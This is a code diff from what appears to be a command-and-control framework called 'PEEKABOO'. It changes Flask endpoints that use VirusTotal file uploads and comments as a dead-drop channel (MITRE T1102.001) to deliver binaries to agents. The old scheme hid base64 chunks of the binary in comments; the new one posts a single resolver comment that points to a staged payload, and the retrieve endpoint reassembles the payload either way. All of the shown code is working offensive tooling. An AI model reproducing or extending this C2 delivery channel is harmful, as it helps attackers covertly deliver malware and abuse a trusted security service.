@@ -801,7 +801,7 @@ def c2_deliver_virustotal():
         raw    = binary.read_bytes()
         sha256 = hashlib.sha256(raw).hexdigest()
 
-        # 1. Upload file to VT (registers the SHA256; also demonstrates T1102 abuse)
+        # 1. Upload to VT (detection scoring demo, registers the SHA256)
         with open(binary, "rb") as f:
             resp = _requests.post(
                 "https://www.virustotal.com/api/v3/files",
@@ -810,43 +810,85 @@ def c2_deliver_virustotal():
                 timeout=60,
             )
         if resp.status_code not in (200, 201):
-            err = resp.json().get("error", {}).get("message", resp.text[:200])
-            return jsonify({"ok": False, "error": f"VT upload failed: {err}"}), 400
+            try:
+                err = resp.json().get("error", {}).get("message", "")
+            except Exception:
+                err = resp.text[:200]
+            return jsonify({"ok": False,
+                            "error": f"VT upload failed (HTTP {resp.status_code}): {err}"}), 400
 
         analysis_id = resp.json().get("data", {}).get("id", "")
 
-        # 2. Chunk base64-encoded binary into VT comments (T1102.001 dead drop)
-        #    Format: PEEKABOO|CHUNK|{total:04d}|{idx:04d}|{base64_data}
-        encoded    = base64.b64encode(raw).decode()
-        chunk_size = 3000
-        chunks     = [encoded[i:i + chunk_size] for i in range(0, len(encoded), chunk_size)]
-        total      = len(chunks)
+        # 2. Build a resolver descriptor so the single comment stays small.
+        #    The comment encodes HOW to re-obtain the binary; the binary never
+        #    travels through VT.  This is the real T1102.001 pattern:
+        #    operator posts a pointer on a trusted service; agent resolves it.
+        source = body.get("source", "")
+        if source == "staged" and body.get("staged_id"):
+            descriptor = f"staged:{body['staged_id']}"
+        elif source == "build" and body.get("build_id"):
+            fname_part = body.get("fname") or "peekaboo.exe"
+            descriptor = f"build:{body['build_id']}:{fname_part}"
+        elif source == "session" and body.get("session_id"):
+            descriptor = f"session:{body['session_id']}:{body.get('filename', '')}"
+        else:
+            # Fallback: auto-stage the binary so the retrieve endpoint can find it
+            _C2_STAGED_DIR.mkdir(parents=True, exist_ok=True)
+            s_id = uuid.uuid4().hex[:8]
+            dest = _C2_STAGED_DIR / f"{s_id}_{binary.name}"
+            dest.write_bytes(raw)
+            _C2_STAGED[s_id] = {"path": dest, "name": binary.name, "size": len(raw)}
+            descriptor = f"staged:{s_id}"
 
-        comment_ids: list[str] = []
-        for idx, chunk_data in enumerate(chunks):
-            text = f"PEEKABOO|CHUNK|{total:04d}|{idx:04d}|{chunk_data}"
+        comment_text = f"PEEKABOO|RESOLVER|{descriptor}"
+
+        # 3. Post ONE resolver comment.
+        #    VT needs time to index the SHA256 after upload before the
+        #    file/{sha256}/comments endpoint accepts writes.
+        #    Retry with back-off: 5 s → 10 s → 15 s → 20 s (50 s total max).
+        comment_posted = False
+        comment_error  = ""
+        waited_secs    = 0
+        for delay in (5, 10, 15, 20):
+            time.sleep(delay)
+            waited_secs += delay
             cr = _requests.post(
                 f"https://www.virustotal.com/api/v3/files/{sha256}/comments",
                 headers={"x-apikey": api_key, "Content-Type": "application/json"},
-                json={"data": {"type": "comment", "attributes": {"text": text}}},
+                json={"data": {"type": "comment", "attributes": {"text": comment_text}}},
                 timeout=15,
             )
-            if cr.status_code == 200:
-                comment_ids.append(cr.json().get("data", {}).get("id", ""))
-            time.sleep(0.25)   # respect free-tier rate limits
+            if cr.status_code in (200, 201):
+                comment_posted = True
+                break
+            try:
+                comment_error = cr.json().get("error", {}).get("message",
+                                                               f"HTTP {cr.status_code}")
+            except Exception:
+                comment_error = f"HTTP {cr.status_code}"
+            # 404 = not indexed yet, 429 = rate limit → keep retrying
+            if cr.status_code not in (404, 429):
+                break
 
         return jsonify({
-            "ok":              True,
-            "channel":         "virustotal",
-            "technique":       "T1102 + T1102.001",
-            "file":            binary.name,
-            "size":            len(raw),
-            "sha256":          sha256,
-            "analysis_id":     analysis_id,
-            "analysis_url":    f"https://www.virustotal.com/gui/file-analysis/{analysis_id}",
-            "chunks":          total,
-            "comments_posted": len(comment_ids),
-            "note":            "Binary staged as base64 chunks in VT comments. Use sha256 to retrieve.",
+            "ok":             True,
+            "channel":        "virustotal",
+            "technique":      "T1102 + T1102.001",
+            "file":           binary.name,
+            "size":           len(raw),
+            "sha256":         sha256,
+            "analysis_id":    analysis_id,
+            "analysis_url":   f"https://www.virustotal.com/gui/file-analysis/{analysis_id}",
+            "comment_posted": comment_posted,
+            "comment_error":  comment_error,
+            "descriptor":     descriptor,
+            "waited_secs":    waited_secs,
+            "note":           (
+                "Resolver comment posted — agent reads VT comment, resolves descriptor, fetches binary."
+                if comment_posted else
+                f"Upload OK but resolver comment failed: {comment_error}. "
+                "Try Retrieve anyway — comment may appear after analysis completes."
+            ),
         })
     except Exception as e:
         return jsonify({"ok": False, "error": str(e)}), 500
@@ -855,8 +897,10 @@ def c2_deliver_virustotal():
 @app.route("/api/c2/retrieve/virustotal", methods=["POST"])
 def c2_retrieve_virustotal():
     """
-    Agent-side retrieval: fetch PEEKABOO chunk comments from VT by SHA256,
-    reassemble, and return the binary as base64.
+    Agent-side retrieval: read PEEKABOO comment from VT by SHA256,
+    resolve the descriptor, and return the binary as base64.
+    Supports PEEKABOO|RESOLVER|{descriptor} (new) and
+    legacy PEEKABOO|CHUNK| (chunked base64) comments.
     MITRE ATT&CK: T1102.001 (Dead Drop Resolver)
     """
     if not HAS_REQUESTS:
@@ -870,13 +914,13 @@ def c2_retrieve_virustotal():
     if not api_key:
         return jsonify({"ok": False, "error": "virustotal not configured"}), 400
 
-    data   = request.get_json(force=True) or {}
-    sha256 = data.get("sha256", "").strip().lower()
+    req    = request.get_json(force=True) or {}
+    sha256 = req.get("sha256", "").strip().lower()
     if not sha256 or len(sha256) != 64 or not all(c in "0123456789abcdef" for c in sha256):
         return jsonify({"ok": False, "error": "valid sha256 required"}), 400
 
     try:
-        # Paginate through all comments for this file
+        # Fetch all comments for this file (paginated)
         all_comments: list[dict] = []
         next_url: str | None = (
             f"https://www.virustotal.com/api/v3/files/{sha256}/comments?limit=40"
@@ -885,15 +929,68 @@ def c2_retrieve_virustotal():
             r = _requests.get(next_url, headers={"x-apikey": api_key}, timeout=15)
             if r.status_code != 200:
                 break
-            page      = r.json()
+            page     = r.json()
             all_comments.extend(page.get("data", []))
-            cursor    = page.get("meta", {}).get("cursor")
-            next_url  = (
+            cursor   = page.get("meta", {}).get("cursor")
+            next_url = (
                 f"https://www.virustotal.com/api/v3/files/{sha256}"
                 f"/comments?limit=40&cursor={cursor}"
             ) if cursor else None
 
-        # Parse PEEKABOO|CHUNK|{total:04d}|{idx:04d}|{data}
+        # --- New format: PEEKABOO|RESOLVER|{descriptor} ---
+        descriptor: str | None = None
+        for c in all_comments:
+            text = c.get("attributes", {}).get("text", "")
+            if text.startswith("PEEKABOO|RESOLVER|"):
+                descriptor = text[len("PEEKABOO|RESOLVER|"):]
+                break
+
+        if descriptor is not None:
+            if descriptor.startswith("staged:"):
+                s_id  = descriptor[7:]
+                entry = _C2_STAGED.get(s_id)
+                if not entry or not entry["path"].exists():
+                    return jsonify({"ok": False,
+                                    "error": f"staged binary not found: {s_id}"})
+                payload = entry["path"].read_bytes()
+
+            elif descriptor.startswith("build:"):
+                parts    = descriptor[6:].split(":", 1)
+                build_id = parts[0]
+                fname    = parts[1] if len(parts) > 1 else "peekaboo.exe"
+                p = _c2_resolve_binary({"source": "build",
+                                        "build_id": build_id, "fname": fname})
+                if not p:
+                    return jsonify({"ok": False,
+                                    "error": f"build binary not found: {descriptor}"})
+                payload = p.read_bytes()
+
+            elif descriptor.startswith("session:"):
+                parts = descriptor[8:].split(":", 1)
+                sid   = parts[0]
+                fn    = parts[1] if len(parts) > 1 else ""
+                p = _c2_resolve_binary({"source": "session",
+                                        "session_id": sid, "filename": fn})
+                if not p:
+                    return jsonify({"ok": False,
+                                    "error": f"session file not found: {descriptor}"})
+                payload = p.read_bytes()
+
+            else:
+                return jsonify({"ok": False,
+                                "error": f"unknown descriptor format: {descriptor[:60]}"})
+
+            return jsonify({
+                "ok":          True,
+                "sha256":      sha256,
+                "descriptor":  descriptor,
+                "size":        len(payload),
+                "payload_b64": base64.b64encode(payload).decode(),
+                "technique":   "T1102.001",
+                "mode":        "resolver",
+            })
+
+        # --- Legacy format: PEEKABOO|CHUNK|{total}|{idx}|{data} ---
         chunk_map:      dict[int, str] = {}
         total_expected: int | None     = None
         for c in all_comments:
@@ -912,17 +1009,18 @@ def c2_retrieve_virustotal():
                 continue
 
         if total_expected is None:
-            return jsonify({"ok": False, "error": "no PEEKABOO chunks found in VT comments"})
+            return jsonify({"ok": False,
+                            "error": "no PEEKABOO resolver or chunk comments found"})
         if len(chunk_map) != total_expected:
             return jsonify({
-                "ok":             False,
-                "error":          f"incomplete: got {len(chunk_map)}/{total_expected} chunks",
-                "chunks_found":   len(chunk_map),
+                "ok":              False,
+                "error":           f"incomplete chunks: got {len(chunk_map)}/{total_expected}",
+                "chunks_found":    len(chunk_map),
                 "chunks_expected": total_expected,
             })
 
         encoded = "".join(chunk_map[i] for i in range(total_expected))
-        payload = base64.b64decode(encoded)
+        payload  = base64.b64decode(encoded)
 
         return jsonify({
             "ok":          True,
@@ -931,6 +1029,7 @@ def c2_retrieve_virustotal():
             "chunks":      total_expected,
             "payload_b64": base64.b64encode(payload).decode(),
             "technique":   "T1102.001",
+            "mode":        "chunks",
         })
     except Exception as e:
         return jsonify({"ok": False, "error": str(e)}), 500
